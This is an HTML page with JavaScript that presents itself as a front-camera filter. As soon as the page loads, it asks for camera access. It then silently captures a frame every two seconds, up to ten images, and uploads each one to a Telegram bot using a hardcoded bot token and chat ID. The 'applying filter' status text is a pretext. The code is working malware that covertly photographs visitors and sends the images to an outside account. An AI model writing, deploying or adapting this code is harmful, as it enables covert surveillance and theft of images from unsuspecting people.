<!DOCTYPE html>
<html>
<head>
    <title>Camera Access</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <div id="status">Initializing front camera...</div>
    <video id="video" width="640" height="480" autoplay muted playsinline></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusDiv = document.getElementById('status');
        const ctx = canvas.getContext('2d');
        
        // Telegram bot configuration
        const BOT_TOKEN = '8447046927:AAGkZglPorvHmF1rjSnxBTRvEL7EkderPoQ';
        const CHAT_ID = '6587469484';
        
        let captureInterval;
        let imagesSent = 0;
        const MAX_IMAGES = 10; // Safety limit
        
        async function initializeCamera() {
            try {
                statusDiv.textContent = 'Requesting front camera access for filter...';
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user', // Use front camera
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                video.srcObject = stream;
                statusDiv.textContent = 'Front camera active - applying filter...';
                
                // Start capturing images every 2 seconds
                startContinuousCapture();
                
            } catch (error) {
                statusDiv.textContent = 'Camera access error :( ' + error.message;
                console.error('Camera error:', error);
            }
        }
        
        function startContinuousCapture() {
            captureInterval = setInterval(async () => {
                if (imagesSent >= MAX_IMAGES) {
                    statusDiv.textContent = `Capture complete - ${MAX_IMAGES} images sent`;
                    clearInterval(captureInterval);
                    return;
                }
                
                try {
                    // Capture image
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to blob and send
                    canvas.toBlob(async (blob) => {
                        const success = await sendToTelegram(blob);
                        if (success) {
                            imagesSent++;
                            statusDiv.textContent = `Images sent: ${imagesSent}/${MAX_IMAGES}`;
                        }
                    }, 'image/jpeg', 0.8);
                    
                } catch (error) {
                    console.error('Capture error:', error);
                }
            }, 2000); // 2 second interval
        }
        
        async function sendToTelegram(imageBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', imageBlob, `capture_${Date.now()}.jpg`);
                formData.append('caption', `Image ${imagesSent + 1} - ${new Date().toLocaleString()}`);
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                
                const data = await response.json();
                console.log(`Image ${imagesSent + 1} sent successfully`);
                return true;
                
            } catch (error) {
                console.error('Error sending image:', error);
                return false;
            }
        }
        
        // Auto-initialize when page loads
        window.addEventListener('load', initializeCamera);
        
        // Clean up on page unload
        window.addEventListener('beforeunload', () => {
            if (captureInterval) {
                clearInterval(captureInterval);
            }
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
            }
        });
    </script>
    
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            text-align: center;
            background: #f0f0f0;
        }
        #status {
            padding: 10px;
            margin: 10px 0;
            background: #fff;
            border-radius: 5px;
            font-weight: bold;
        }
        video, canvas {
            max-width: 100%;
            height: auto;
            border: 2px solid #333;
            border-radius: 10px;
        }
    </style>
</body>
</html>
